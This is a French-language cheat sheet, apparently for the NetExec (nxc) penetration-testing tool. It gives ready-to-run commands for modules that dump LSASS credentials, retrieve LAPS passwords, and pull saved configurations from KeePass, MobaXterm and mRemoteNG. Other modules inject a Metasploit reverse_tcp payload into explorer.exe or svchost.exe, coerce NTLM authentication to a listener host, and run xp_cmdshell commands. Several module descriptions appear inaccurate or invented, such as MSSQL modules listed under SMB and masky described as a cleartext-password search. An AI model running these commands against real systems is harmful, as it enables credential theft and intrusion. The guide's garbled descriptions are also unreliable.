**1. Nom du Module : `install_elevated`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module installe des binaires ou services avec des privilèges élevés sur un hôte cible.

**2. Options / Paramètres**

* `--BINARY` : Chemin local vers le binaire à installer.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M install_elevated -o BINARY=/path/to/binary.exe
```

**Explication** :

* Installe le binaire spécifié avec des privilèges élevés sur la cible.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M install_elevated -o BINARY=/path/to/binary.exe,OUTPUT=install_results.txt
```

**Explication** :

* Sauvegarde les résultats de l’installation dans `install_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M install_elevated -o BINARY=/path/to/binary.exe,OUTPUT=all_install_results.txt
```

**Explication** :

* Compile les résultats des installations sur toutes les cibles dans un fichier unique.

***

#### Module : `ioxidresolver`

**1. Nom du Module : `ioxidresolver`**

* **Protocole pris en charge** : RPC
* **Description** : Ce module interroge l’interface IObjectExporter pour énumérer les informations liées à l’OXID et les interfaces RPC enregistrées.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc rpc 192.168.1.10 -u admin -p 'password' -M ioxidresolver
```

**Explication** :

* Interroge l’interface RPC IObjectExporter sur la cible pour collecter les informations OXID.

**Commande avec fichier de sortie** :

```
nxc rpc 192.168.1.10 -u admin -p 'password' -M ioxidresolver -o OUTPUT=oxid_info.txt
```

**Explication** :

* Sauvegarde les informations collectées dans `oxid_info.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc rpc targets.txt -M ioxidresolver -o OUTPUT=all_oxid_info.txt
```

**Explication** :

* Compile les informations OXID de toutes les cibles dans un fichier unique.

***

#### Module : `keepass_discover`

**1. Nom du Module : `keepass_discover`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module recherche les fichiers KeePass sur une cible distante.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M keepass_discover
```

**Explication** :

* Recherche les fichiers KeePass sur la cible distante.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M keepass_discover -o OUTPUT=keepass_files.txt
```

**Explication** :

* Sauvegarde les résultats dans `keepass_files.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M keepass_discover -o OUTPUT=all_keepass_files.txt
```

**Explication** :

* Compile les fichiers KeePass trouvés sur toutes les cibles dans un fichier unique.

***

#### Module : `keepass_trigger`

**1. Nom du Module : `keepass_trigger`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module utilise une commande personnalisée pour tenter d’accéder aux fichiers KeePass détectés.

**2. Options / Paramètres**

* `--FILE` : Chemin du fichier KeePass cible.
* `--COMMAND` : Commande à exécuter pour accéder au fichier.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M keepass_trigger -o FILE=C:\\path\\to\\keepass.kdbx,COMMAND="open"
```

**Explication** :

* Exécute la commande pour accéder au fichier KeePass spécifié.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M keepass_trigger -o FILE=C:\\path\\to\\keepass.kdbx,COMMAND="open"
```

**Explication** :

* Tente d’accéder au fichier KeePass sur plusieurs cibles à l’aide de la commande spécifiée.

***

#### Module : `laps`

**1. Nom du Module : `laps`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module récupère les mots de passe LAPS (Local Administrator Password Solution) configurés sur les machines du domaine.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les mots de passe récupérés.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M laps
```

**Explication** :

* Récupère les mots de passe LAPS sur le domaine Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M laps -o OUTPUT=laps_passwords.txt
```

**Explication** :

* Sauvegarde les mots de passe récupérés dans `laps_passwords.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M laps -o OUTPUT=all_laps_passwords.txt
```

**Explication** :

* Compile les mots de passe LAPS de toutes les cibles dans un fichier unique.

***

#### Module : `ldap-checker`

**1. Nom du Module : `ldap-checker`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module effectue des vérifications de base sur la configuration LDAP pour identifier les erreurs potentielles.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats des vérifications.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M ldap-checker
```

**Explication** :

* Vérifie les configurations LDAP sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M ldap-checker -o OUTPUT=ldap_check.txt
```

**Explication** :

* Sauvegarde les résultats des vérifications dans `ldap_check.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M ldap-checker -o OUTPUT=all_ldap_checks.txt
```

**Explication** :

* Compile les vérifications LDAP pour toutes les cibles dans un fichier unique.

***

#### Module : `link_enable_xp`

**1. Nom du Module : `link_enable_xp`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module permet d'activer des fonctionnalités spécifiques pour les liens inter-serveurs sur des environnements utilisant d'anciennes versions de Windows (XP/2003).

**2. Options / Paramètres**

* `--LINK` : Nom du lien cible à activer.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M link_enable_xp -o LINK=example-link
```

**Explication** :

* Active le lien inter-serveur `example-link` sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M link_enable_xp -o LINK=example-link,OUTPUT=link_activation.txt
```

**Explication** :

* Sauvegarde les résultats de l'activation dans `link_activation.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M link_enable_xp -o LINK=example-link,OUTPUT=all_link_activations.txt
```

**Explication** :

* Active le lien pour toutes les cibles définies dans le fichier et compile les résultats.

***

#### Module : `link_xpcmd`

**1. Nom du Module : `link_xpcmd`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module exécute des commandes personnalisées sur des liens inter-serveurs configurés pour des environnements XP/2003.

**2. Options / Paramètres**

* `--LINK` : Nom du lien cible pour exécuter la commande.
* `--COMMAND` : Commande à exécuter sur le lien spécifié.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M link_xpcmd -o LINK=example-link,COMMAND="ipconfig"
```

**Explication** :

* Exécute la commande `ipconfig` sur le lien `example-link` de la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -M link_xpcmd -o LINK=example-link,COMMAND="ipconfig",OUTPUT=cmd_results.txt
```

**Explication** :

* Sauvegarde les résultats de la commande dans `cmd_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M link_xpcmd -o LINK=example-link,COMMAND="netstat",OUTPUT=all_cmd_results.txt
```

**Explication** :

* Exécute la commande sur toutes les cibles définies et compile les résultats dans un fichier unique.

***

#### Module : `lsassy`

**1. Nom du Module : `lsassy`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module extrait les informations d'identification depuis la mémoire LSASS d'une cible Windows.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les informations d'identification.
* `--VERBOSE` : Active une sortie détaillée.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M lsassy
```

**Explication** :

* Extrait les informations d'identification de la mémoire LSASS de la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M lsassy -o OUTPUT=lsass_dump.txt
```

**Explication** :

* Sauvegarde les informations d'identification extraites dans `lsass_dump.txt`.

**4. Commandes Avancées**

Commande avec sortie détaillée et multi-cibles :

```
nxc smb targets.txt -M lsassy -o OUTPUT=all_lsass_dumps.txt,VERBOSE=1
```

**Explication** :

* Fournit une sortie détaillée des informations d'identification extraites sur toutes les cibles définies.

***

#### Module : `maq`

**1. Nom du Module : `maq`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module vérifie les valeurs de la MachineAccountQuota sur un domaine Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M maq
```

**Explication** :

* Vérifie la valeur de MachineAccountQuota sur le domaine Active Directory cible.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M maq -o OUTPUT=maq_results.txt
```

**Explication** :

* Sauvegarde les résultats de l'analyse MachineAccountQuota dans `maq_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M maq -o OUTPUT=all_maq_results.txt
```

**Explication** :

* Compile les résultats MachineAccountQuota pour toutes les cibles dans un fichier unique.

***

#### Module : `masky`

**1. Nom du Module : `masky`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module interroge Active Directory pour rechercher des comptes de service configurés avec des mots de passe en texte clair.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M masky
```

**Explication** :

* Rechercher les comptes de service avec des mots de passe en texte clair sur le domaine cible.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M masky -o OUTPUT=service_passwords.txt
```

**Explication** :

* Sauvegarde les résultats dans `service_passwords.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M masky -o OUTPUT=all_service_passwords.txt
```

**Explication** :

* Compile les résultats pour toutes les cibles dans un fichier unique.

***

#### Module : `met_inject`

**1. Nom du Module : `met_inject`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module injecte une charge utile Metasploit directement dans un processus cible.

**2. Options / Paramètres**

* `--PAYLOAD` : Charge utile Metasploit à injecter.
* `--PROCESS` : Nom du processus cible.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M met_inject -o PAYLOAD=reverse_tcp,PROCESS=explorer.exe
```

**Explication** :

* Injecte la charge utile `reverse_tcp` dans le processus `explorer.exe` sur la cible.

**4. Commandes Avancées**

Commande multi-cibles avec configuration avancée :

```
nxc smb targets.txt -M met_inject -o PAYLOAD=reverse_tcp,PROCESS=svchost.exe
```

**Explication** :

* Injecte la charge utile dans le processus spécifié sur plusieurs cibles simultanément.

***

#### Module : `mobaxterm`

**1. Nom du Module : `mobaxterm`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module recherche et extrait les informations de configuration de l'application MobaXterm sur une cible.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les configurations extraites.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M mobaxterm
```

**Explication** :

* Recherche les fichiers de configuration MobaXterm sur la cible et extrait les informations pertinentes.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M mobaxterm -o OUTPUT=mobaxterm_config.txt
```

**Explication** :

* Sauvegarde les configurations extraites dans `mobaxterm_config.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M mobaxterm -o OUTPUT=all_mobaxterm_configs.txt
```

**Explication** :

* Compile les configurations MobaXterm de toutes les cibles dans un fichier unique.

***

#### Module : `mremoteng`

**1. Nom du Module : `mremoteng`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module recherche et extrait les configurations enregistrées de l'application mRemoteNG sur une cible.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les configurations extraites.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M mremoteng
```

**Explication** :

* Recherche les fichiers de configuration mRemoteNG sur la cible et extrait les informations pertinentes.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M mremoteng -o OUTPUT=mremoteng_config.txt
```

**Explication** :

* Sauvegarde les configurations extraites dans `mremoteng_config.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M mremoteng -o OUTPUT=all_mremoteng_configs.txt
```

**Explication** :

* Compile les configurations mRemoteNG de toutes les cibles dans un fichier unique.

***

#### Module : `ms17-010`

**1. Nom du Module : `ms17-010`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module détecte la vulnérabilité EternalBlue (MS17-010) sur des cibles Windows.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M ms17-010
```

**Explication** :

* Vérifie si la cible est vulnérable à MS17-010.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M ms17-010 -o OUTPUT=ms17-010_results.txt
```

**Explication** :

* Sauvegarde les résultats de l'analyse dans `ms17-010_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M ms17-010 -o OUTPUT=all_ms17-010_results.txt
```

**Explication** :

* Compile les résultats de l'analyse MS17-010 pour toutes les cibles dans un fichier unique.

***

#### Module : `msol`

**1. Nom du Module : `msol`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module énumère les informations liées aux comptes Office 365 configurés dans un environnement hybride Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M msol
```

**Explication** :

* Liste les comptes Office 365 synchronisés avec Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M msol -o OUTPUT=msol_accounts.txt
```

**Explication** :

* Sauvegarde les informations sur les comptes Office 365 dans `msol_accounts.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M msol -o OUTPUT=all_msol_accounts.txt
```

**Explication** :

* Compile les informations sur les comptes Office 365 pour toutes les cibles dans un fichier unique.

***

#### Module : `mssql_coerce`

**1. Nom du Module : `mssql_coerce`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module exploite les fonctionnalités SQL Server pour forcer une authentification NTLM sur un autre hôte.

**2. Options / Paramètres**

* `--LISTEN` : Adresse IP de l’hôte écouteur pour capturer les tentatives d’authentification.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M mssql_coerce -o LISTEN=192.168.1.20
```

**Explication** :

* Force la cible à s’authentifier sur l’hôte `192.168.1.20`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M mssql_coerce -o LISTEN=192.168.1.20
```

**Explication** :

* Applique la coercition NTLM sur plusieurs cibles spécifiées.

***

#### Module : `mssql_priv`

**1. Nom du Module : `mssql_priv`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module vérifie et exploite les privilèges SQL Server pour exécuter des commandes arbitraires sur la cible.

**2. Options / Paramètres**

* `--COMMAND` : Commande à exécuter sur SQL Server.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M mssql_priv -o COMMAND="xp_cmdshell 'whoami'"
```

**Explication** :

* Exécute la commande `whoami` via SQL Server sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M mssql_priv -o COMMAND="xp_cmdshell 'dir'",OUTPUT=cmd_results.txt
```

**Explication** :

* Sauvegarde les résultats de la commande dans `cmd_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M mssql_priv -o COMMAND="xp_cmdshell 'netstat'",OUTPUT=all_results.txt
```

**Explication** :

* Exécute une commande via SQL Server sur plusieurs cibles simultanément.

***

